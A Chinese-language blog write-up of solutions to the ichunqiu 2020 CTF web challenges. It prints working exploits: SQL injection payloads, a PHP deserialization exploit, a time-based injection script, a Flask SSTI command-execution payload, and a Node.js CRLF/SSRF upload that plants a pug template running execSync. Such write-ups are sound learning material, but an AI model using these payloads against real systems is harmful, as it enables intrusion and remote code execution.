---
title: 2020WriteUp 汇总 VOL 1
summary: ichunqiu新春战疫公益赛
featured-img: 2020-wp-vol1
layout: post
---

+ [ichunqiu新春战役公益赛](#ichunqiu新春战役公益赛)

***

## ichunqiu新春战役公益赛

### DAY 1

### 简单的招聘系统

登录存在注入，`1'||id=1#`登录admin账号, admin账号处可查询用户key，二次注入(ichunqiu平台貌似限制了请求最大响应时间)

SQL为`INSERT INTO log(key, uname, profile) (SELECT key, uname, profile WHERE key='')`，通过修改普通用户的profile，用admin来查询，二次 + 报错注一下就行了

```
profile=123' and 1=(updatexml(1,mid(concat(0x25,(select flaaag from flag)),16,32),1)))#
```

***

### 简单上传

无过滤，不知道这题想干嘛

### babyphp

这题出的还行，但就是太刻意了，为了出题而出题，写了一堆莫名其妙的魔术方法，代码水平我也就不吐槽了

反序列化链：

```
UpdateHelper.__destruct
User.__toString
Info.update -> Info.__call
Info.CtrlCase.login  // argument可控
dbCtrl.login
```

反序列化点在`user.update`，将对象注入到`user.age`，利用过滤函数增加字符长度来溢出，注入类成员（类似于Joomla3.4.6 RCE）

```php
public function update()
{
    $Info = unserialize($this->getNewinfo());
    $age = $Info->age;
    $nickname = $Info->nickname;
    $updateAction = new UpdateHelper(
        $_SESSION['id'],
        $Info,
        "update user SET age=$age,nickname=$nickname where id=" . $_SESSION['id']
    );
    //这个功能还没有写完 先占坑
}
public function getNewInfo()
{
    $age = $_POST['age'];
    $nickname = $_POST['nickname'];
    return safe(serialize(new Info($age, $nickname)));
}
```

EXP：

```php
<?php

function safe($parm) {
    $array = array('union', 'regexp', 'load', 'into', 'flag', 'file', 'insert', "'", '\\', "*", "alter");
    return str_replace($array, 'hacker', $parm);
}

class User {
    public $id;
    public $age = null;
    public $nickname = null;
}

class Info {
    public $age;
    public $nickname;
    public $CtrlCase;
}

class UpdateHelper {
    public $id;
    public $newinfo;
    public $sql;
}

class dbCtrl {
    public $hostname = "127.0.0.1";
    public $dbuser = "noob123";
    public $dbpass = "noob123";
    public $database = "noob123";
    public $name;
    public $password;
    public $mysqli;
    public $token;
}

$uh = new UpdateHelper;
$u = new User;
$i = new Info;
$dc = new dbCtrl;

$dc->name='admin';
$dc->password='p';
$i->CtrlCase = $dc;
$u->nickname = $i;
$u->age = 'SELECT id, 0x3833383738633931313731333338393032653066653066623937613863343761 FROM user WHERE username=?';
$uh->sql = $u;

$exp = serialize($uh);

$ii = new Info;
$ii->age = '1*********************************************************************************************************";s:8:"nickname";'.$exp.'s:8:"CtrlCase";N;}';

echo $ii->age;
```

可设置$_SESSION['token']为admin，登录逻辑会直接设置login=1

本地打通了，远程不知道为啥注入对象的析构函数没有被调用（玄学?）

P.s. 既然能控制mysql连接了，利用load local infile直接读flag.php应该也可行，具体看题目环境配置了

### babysqli

没时间看了，看解题人数比上一题反序列化简单

### DAY 2

### easysqli_copy

PDO堆叠 + 宽字节 + 延时，家里路由器无线桥接后信号一直不太好，脚本跑了半天。延时注入有必要弄一堆奇怪又长的列名来浪费时间吗，而且题目本身就select了一列，flag占一列，为什么要设置总共>=四列，觉得你的列名很萌萌哒吗

```python
// python2
import requests

url = 'http://addeb1bebcfb48f6a3e6a2c74972ef2fa77a6c4ab4fb41f9.changame.ichunqiu.com/?id='

flag = 'flag{09d3acb6-'

# balabala,eihey,fllllll4g,(后面还有列，我服了，憨憨出题人)
for i in range(15, 50):
    for w in '-0123456789abcdef}':
        _id = '%bf%27;set%20@sql=0x{};prepare%20stmt%20from%20@sql;execute%20stmt;/*'
        payload = 'select if(ascii(mid((select group_concat(fllllll4g) from table1),{},1))={},sleep(3),0)'.format(i, ord(w))
        _id = _id.format(payload.encode('hex'))

        try:
            requests.get(url+_id, timeout=3)
        except:
            flag += w
            break
    print(flag)
```

### another 2 SQLi

又是注入，不做了88

### DAY 3

最后一天了认真打，今天ak了

### FlaskApp

Python3.7.4的SSTI，下了个Python3.7的解释器，发现内置类的架构被重构了，之前常用的payload已经不能通过`object.__subclasses__`访问到了

看了一下`_frozen_importlib.BuiltinImporter`可以用，测了一下服务器上的索引是80

EXP：

```
>>> b("{{''.__class__.__mro__[-1].__subclasses__()[80].load_module('o'+'s')['po'+'pen']('cat this_is_the_fl'+'ag.txt').read()}}")
b'e3snJy5fX2NsYXNzX18uX19tcm9fX1stMV0uX19zdWJjbGFzc2VzX18oKVs4MF0ubG9hZF9tb2R1bGUoJ28nKydzJylbJ3BvJysncGVuJ10oJ2NhdCB0aGlzX2lzX3RoZV9mbCcrJ2FnLnR4dCcpLnJlYWQoKX19'
```

### node_game

这题出的不错，有点麻烦，做了四个小时

拿到代码读了一遍就猜到是CRLF注入一个POST请求来上传模板文件来RCE

首先看一下怎么注入，JS经常出现unicode的问题，参考这个链接`https://xz.aliyun.com/t/2894`

SSRF的流程是：

+ Express获取GET query (此时urldecode一次)
+ 将query拼接到`/source?`后面，丢给http.get请求，此时会urlencode一次
+ CRLF注入一个POST请求访问file_upload接口，HTTP协议报文的控制字符需要是raw的

因为payload是在最外层报文的GET query里，所以只能利用node.js转义unicode的feature来处理空格，引号，`\r\n`等，`\u010d, \u010a, \u0120`

注入一个POST请求成功后，需要上传一个pug模版，google一下pug模板即可。字符串过滤随便绕一下就行了

```
-var x = eval("glob"+"al.proce"+"ss.mainMo"+"dule.re"+"quire('child_'+'pro'+'cess')['ex'+'ecSync']('whoami').toString()")
-return x
```

上传后需要加载模板，可以看到`/?action=`可加载，不过限制了路径穿越，这里就很刻意了。在上传路由里保存了两次，一个重命名了保存在`dist`，另一个副本保存在`uploads/MIME_TYPE/FEIL_NAME`，在MIME里跳一下目录到template就行了

EXP：

```python
import requests


payload = """2 HTTP/1.1
Host: 127.0.0.1
Connection: keep-alive

POST /file_upload HTTP/1.1
Host: 127.0.0.1
Content-Length: {}
Content-Type: multipart/form-data; boundary=------------------------a6a8d18957515a9a

{}""".replace('\n', '\r\n')

body = """--------------------------a6a8d18957515a9a
Content-Disposition: form-data; name="file"; filename="evil2.pug"
Content-Type: ../template

-var x = eval("glob"+"al.proce"+"ss.mainMo"+"dule.re"+"quire('child_'+'pro'+'cess')['ex'+'ecSync']('cat /flag.txt').toString()")
-return x
--------------------------a6a8d18957515a9a--

""".replace('\n', '\r\n').replace('+', '\u012b')

payload = payload.format(len(body), body).replace(' ', '\u0120').replace('\r\n', '\u010d\u010a').replace('"', '\u0122').replace("'", '\u0a27').replace(' ', '\u0120').replace('\r\n', '\u010d\u010a').replace('"', '\u0122').replace("'", '\u0a27').replace('[', '\u015b').replace(']', '\u015d')+"GET"+'\u0120'+"/"


print(requests.get('http://101.200.195.106:33322/core?q=' + payload).content)
#print(requests.get('http://127.0.0.1:8081/core?q=' + payload).content)

```

然后访问一下`/?action=evil2`就行了

### ezExpress

配置错误，直接给flag了

### easy_thinking

TP6.0的任意文件写：

https://www.smi1e.top/thinkphp6-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/

getshell后用GC_UAF绕过disabled_functions

